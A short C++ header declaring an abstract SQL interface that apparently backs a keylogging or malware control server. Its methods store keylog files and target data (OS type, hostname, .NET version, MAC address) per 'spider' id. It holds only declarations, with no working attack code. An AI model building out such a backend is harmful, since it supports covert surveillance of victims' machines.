#pragma once

class ISQL {
	virtual bool exec(std::string const& cmd) = 0;
	virtual bool init(std::string const& file) = 0;
	virtual bool add_keylogfiles(int id_spider, std::string date, const char *file, int filesize) = 0;
	virtual bool add_targetsdata(int id_spider, std::string const& ostype, std::string const& hostname, std::string const& dotnet, std::string const& mac_addr) = 0;
};